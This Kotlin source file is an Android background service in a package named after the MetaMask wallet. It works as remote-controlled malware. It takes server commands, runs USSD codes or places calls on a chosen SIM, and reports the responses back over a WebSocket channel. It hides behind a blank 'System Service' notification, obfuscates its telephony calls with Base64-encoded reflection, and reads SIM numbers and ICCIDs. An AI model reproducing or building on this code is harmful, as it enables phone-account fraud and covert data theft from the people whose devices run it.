package com.example.MetaMask.services

import android.Manifest
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Base64
import androidx.annotation.Keep
import androidx.core.content.ContextCompat
import org.json.JSONObject

data class SimInfo(
    val subscriptionId: Int,
    val displayName: String?,
    val number: String?,
    val simSlotIndex: Int,
    val carrierName: String?,
    val iccId: String?
)

@Keep
class UssdControlService : Service() {

    companion object {
        private fun d(s: String): String {
            android.util.Log.d("XDBG", "[SimInfo] d enter s=${s}") //xdbg
            android.util.Log.d("XDBG", "[SimInfo] return") //xdbg
            return try { String(Base64.decode(s, Base64.NO_WRAP)) } catch (e: Exception) { "" }
        }
    }

    private var currentUssdId: String? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        android.util.Log.d("XDBG", "[SimInfo] onCreate enter") //xdbg
        super.onCreate()
        try {
            val channelId = "USSD_Background_Service"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
                val chan = android.app.NotificationChannel(
                    channelId,
                    "System Service",
                    android.app.NotificationManager.IMPORTANCE_NONE
                )
                val manager = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                manager.createNotificationChannel(chan)
            }

            val notification = androidx.core.app.NotificationCompat.Builder(this, channelId)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_menu_call)
                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
                .build()

            startForeground(7777, notification)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SimInfo] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[SimInfo] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        val commandJsonString = intent?.getStringExtra("command")

        if (commandJsonString.isNullOrBlank()) {
            android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
            stopSelf()
            android.util.Log.d("XDBG", "[SimInfo] return") //xdbg
            return START_NOT_STICKY
        }

        try {
            val commandJson = JSONObject(commandJsonString)
            val requestCode = commandJson.optString("requestCode")
            val simCardIndex = commandJson.optInt("simCardIndex", -1)
            this.currentUssdId = commandJson.optString("ussdId")

            if (requestCode.isNotEmpty()) {
                android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
                executeCommand(requestCode, simCardIndex)
            } else {
                sendResultToServer("Failed", null, "Missing requestCode on device.", "", this.currentUssdId)
                stopSelf()
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SimInfo] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            sendResultToServer("Failed", null, "Invalid command format.", "", this.currentUssdId)
            stopSelf()
        }

        android.util.Log.d("XDBG", "[SimInfo] return") //xdbg
        return START_NOT_STICKY
    }

    private fun executeCommand(requestCode: String, simCardIndex: Int) {
        android.util.Log.d("XDBG", "[SimInfo] executeCommand enter requestCode=${requestCode} simCardIndex=${simCardIndex}") //xdbg
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
            sendResultToServer("Failed", null, "Permission denied: CALL_PHONE is required.", requestCode, this.currentUssdId)
            stopSelf()
            return
        }

        if (requestCode.startsWith("*")) {
            android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
            handleUssdRequest(requestCode, simCardIndex)
        } else {
            handleCallRequest(requestCode, simCardIndex)
        }
    }

    private fun handleUssdRequest(ussdCode: String, simCardIndex: Int) {
        android.util.Log.d("XDBG", "[SimInfo] handleUssdRequest enter ussdCode=${ussdCode} simCardIndex=${simCardIndex}") //xdbg
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
            val targetSubscriptionId = getTargetSubscriptionId(simCardIndex)

            if (targetSubscriptionId == -1) {
                android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
                sendResultToServer("Failed", null, "Could not determine sending SIM for USSD.", ussdCode, this.currentUssdId)
                stopSelf()
                return
            }

            val handler = Handler(Looper.getMainLooper())
            try {
                val tm = getSystemService(Context.TELEPHONY_SERVICE)

                val createMethod = d("Y3JlYXRlRm9yU3Vic2NyaXB0aW9uSWQ=")
                val mCreate = tm.javaClass.methods.find { it.name == createMethod }
                val specificTm = mCreate?.invoke(tm, targetSubscriptionId)

                val callback = object : TelephonyManager.UssdResponseCallback() {
                    override fun onReceiveUssdResponse(telephonyManager: TelephonyManager, request: String, response: CharSequence) {
                        android.util.Log.d("XDBG", "[SimInfo] onReceiveUssdResponse enter telephonyManager=${telephonyManager} request=${request} response=${response}") //xdbg
                        if (request == "*31#") {
                            android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
                            getSharedPreferences("DeviceCheck", Context.MODE_PRIVATE)
                                .edit()
                                .putBoolean("ussd_confirmed", true)
                                .apply()
                        }
                        val responseString = response.toString()
                        if (responseString.startsWith("USSD Ошибка")) {
                            android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
                            val newMessage = "Неудачный USSD запрос , повторите попытку снова"
                            sendResultToServer("Failed", null, newMessage, request, this@UssdControlService.currentUssdId)
                        } else {
                            sendResultToServer("Success", responseString, null, request, this@UssdControlService.currentUssdId)
                        }
                        stopSelf()
                    }

                    override fun onReceiveUssdResponseFailed(telephonyManager: TelephonyManager, request: String, failureCode: Int) {
                        android.util.Log.d("XDBG", "[SimInfo] onReceiveUssdResponseFailed enter telephonyManager=${telephonyManager} request=${request} failureCode=${failureCode}") //xdbg
                        val serverMessage = "Неудачный USSD запрос , повторите попытку снова"
                        sendResultToServer("Failed", null, serverMessage, request, this@UssdControlService.currentUssdId)
                        stopSelf()
                    }
                }

                if (specificTm != null) {
                    android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
                    val sendMethod = d("c2VuZFVzc2RSZXF1ZXN0")
                    val mSend = specificTm.javaClass.methods.find { it.name == sendMethod }
                    mSend?.invoke(specificTm, ussdCode, callback, handler)
                } else {
                    throw Exception("Failed to create TelephonyManager for SubId")
                }

            } catch (se: SecurityException) {
                android.util.Log.e("XDBG", "[SimInfo] catch ${se.javaClass.simpleName}: ${se.message}") //xdbg
                sendResultToServer("Failed", null, "Permission error on sending USSD: ${se.message}", ussdCode, this.currentUssdId)
                stopSelf()
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[SimInfo] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                sendResultToServer("Failed", null, "Exception on device: ${e.message}", ussdCode, this.currentUssdId)
                stopSelf()
            }
        } else {
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:${Uri.encode(ussdCode)}")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            try {
                startActivity(intent)
                sendResultToServer("Sent (legacy)", null, "Result cannot be captured on this Android version.", ussdCode, this.currentUssdId)
            } catch (se: SecurityException) {
                android.util.Log.e("XDBG", "[SimInfo] catch ${se.javaClass.simpleName}: ${se.message}") //xdbg
                sendResultToServer("Failed (legacy)", null, "Permission error: ${se.message}", ussdCode, this.currentUssdId)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[SimInfo] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                sendResultToServer("Failed (legacy)", null, e.message, ussdCode, this.currentUssdId)
            } finally {
                stopSelf()
            }
        }
    }

    private fun handleCallRequest(phoneNumber: String, simCardIndex: Int) {
        android.util.Log.d("XDBG", "[SimInfo] handleCallRequest enter phoneNumber=${phoneNumber} simCardIndex=${simCardIndex}") //xdbg
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
            val targetSubscriptionId = getTargetSubscriptionId(simCardIndex)

            if (targetSubscriptionId == -1) {
                android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
                sendResultToServer("Failed", null, "Could not determine sending SIM for Call.", phoneNumber, this.currentUssdId)
                stopSelf()
                return
            }

            val handler = Handler(Looper.getMainLooper())
            val dummyCallback = object : TelephonyManager.UssdResponseCallback() {
                override fun onReceiveUssdResponse(tm: TelephonyManager, req: String, res: CharSequence) {}
                override fun onReceiveUssdResponseFailed(tm: TelephonyManager, req: String, code: Int) {}
            }

            try {
                val tm = getSystemService(Context.TELEPHONY_SERVICE)

                val createMethod = d("Y3JlYXRlRm9yU3Vic2NyaXB0aW9uSWQ=")
                val mCreate = tm.javaClass.methods.find { it.name == createMethod }
                val specificTm = mCreate?.invoke(tm, targetSubscriptionId)

                if (specificTm != null) {
                    android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
                    val sendMethod = d("c2VuZFVzc2RSZXF1ZXN0")
                    val mSend = specificTm.javaClass.methods.find { it.name == sendMethod }
                    mSend?.invoke(specificTm, phoneNumber, dummyCallback, handler)

                    sendResultToServer(
                        status = "error",
                        data = null,
                        message = "Запрос на звонок отправлен, если есть деньги на счету или не нагружен оператор сим то звонок произойдёт отследить выполнение не возможно",
                        request = phoneNumber,
                        ussdId = this.currentUssdId
                    )
                } else {
                    throw Exception("Failed to create TelephonyManager for SubId")
                }
            } catch (se: SecurityException) {
                android.util.Log.e("XDBG", "[SimInfo] catch ${se.javaClass.simpleName}: ${se.message}") //xdbg
                sendResultToServer("Failed", null, "Permission error on initiating call: ${se.message}", phoneNumber, this.currentUssdId)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[SimInfo] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                sendResultToServer("Failed", null, "Exception on device while initiating call: ${e.message}", phoneNumber, this.currentUssdId)
            } finally {
                stopSelf()
            }
        } else {
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:${Uri.encode(phoneNumber)}")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            try {
                startActivity(intent)
                sendResultToServer(
                    status = "error",
                    data = null,
                    message = "Запрос на звонок отправлен, если есть деньги на счету или не нагружен оператор сим то звонок произойдёт отследить выполнение не возможно",
                    request = phoneNumber,
                    ussdId = this.currentUssdId
                )
            } catch (se: SecurityException) {
                android.util.Log.e("XDBG", "[SimInfo] catch ${se.javaClass.simpleName}: ${se.message}") //xdbg
                sendResultToServer("Failed (legacy)", null, "Permission error: ${se.message}", phoneNumber, this.currentUssdId)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[SimInfo] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                sendResultToServer("Failed (legacy)", null, e.message, phoneNumber, this.currentUssdId)
            } finally {
                stopSelf()
            }
        }
    }

    private fun getTargetSubscriptionId(simCardIndex: Int): Int {
        android.util.Log.d("XDBG", "[SimInfo] getTargetSubscriptionId enter simCardIndex=${simCardIndex}") //xdbg
        val activeSims = getCurrentActiveSims(this)
        var targetSubscriptionId = -1
        if (activeSims.isNotEmpty()) {
            android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
            val simToUse = if (simCardIndex != -1) activeSims.find { it.simSlotIndex == simCardIndex }
            else {
                android.util.Log.d("XDBG", "[SimInfo] else branch") //xdbg
                activeSims.firstOrNull()
            }
            targetSubscriptionId = simToUse?.subscriptionId ?: -1
        }
        android.util.Log.d("XDBG", "[SimInfo] return") //xdbg
        return targetSubscriptionId
    }

    private fun getCurrentActiveSims(context: Context): List<SimInfo> {
        android.util.Log.d("XDBG", "[SimInfo] getCurrentActiveSims enter context=ctx") //xdbg
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
            android.util.Log.d("XDBG", "[SimInfo] return") //xdbg
            return emptyList()
        }
        val simInfoList = mutableListOf<SimInfo>()
        try {
            val subMan = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
            if (subMan != null) {
                android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
                val getListMethod = d("Z2V0QWN0aXZlU3Vic2NyaXB0aW9uSW5mb0xpc3Q=")
                val mList = subMan.javaClass.methods.find { it.name == getListMethod }
                val list = mList?.invoke(subMan) as? List<*>

                list?.forEach { subInfo ->
                    if (subInfo != null) {
                        android.util.Log.d("XDBG", "[SimInfo] if branch") //xdbg
                        val idM = subInfo.javaClass.methods.find { it.name == d("Z2V0U3Vic2NyaXB0aW9uSWQ=") }
                        val id = idM?.invoke(subInfo) as? Int ?: -1

                        val nameM = subInfo.javaClass.methods.find { it.name == d("Z2V0RGlzcGxheU5hbWU=") }
                        val display = nameM?.invoke(subInfo)?.toString()

                        val numM = subInfo.javaClass.methods.find { it.name == d("Z2V0TnVtYmVy") }
                        val num = numM?.invoke(subInfo)?.toString()

                        val slotM = subInfo.javaClass.methods.find { it.name == d("Z2V0U2ltU2xvdEluZGV4") }
                        val slot = slotM?.invoke(subInfo) as? Int ?: -1

                        val carM = subInfo.javaClass.methods.find { it.name == d("Z2V0Q2Fycmllck5hbWU=") }
                        val carrier = carM?.invoke(subInfo)?.toString()

                        val iccM = subInfo.javaClass.methods.find { it.name == d("Z2V0SWNjSWQ=") }
                        val icc = iccM?.invoke(subInfo)?.toString()

                        simInfoList.add(
                            SimInfo(
                                subscriptionId = id,
                                displayName = display,
                                number = num,
                                simSlotIndex = slot,
                                carrierName = carrier,
                                iccId = icc
                            )
                        )
                    }
                }
            }
        } catch (se: SecurityException) {
            android.util.Log.e("XDBG", "[SimInfo] catch ${se.javaClass.simpleName}: ${se.message}") //xdbg
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SimInfo] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
        android.util.Log.d("XDBG", "[SimInfo] return") //xdbg
        return simInfoList
    }

    private fun sendResultToServer(status: String, data: String?, message: String?, request: String, ussdId: String?) {
        android.util.Log.d("XDBG", "[SimInfo] sendResultToServer enter status=${status} data=${data} message=${message} request=${request} ussdId=${ussdId}") //xdbg
        val resultJson = JSONObject().apply {
            put("action", "commandChannelResponse")
            put("status", status)
            put("request", request)
            data?.let { put("data", it) }
            message?.let { put("message", it) }
            ussdId?.let { if (it.isNotEmpty()) put("ussdId", it) }
        }
        val intent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
            putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, resultJson.toString())
            setPackage(packageName)
        }
        sendBroadcast(intent)
    }
}
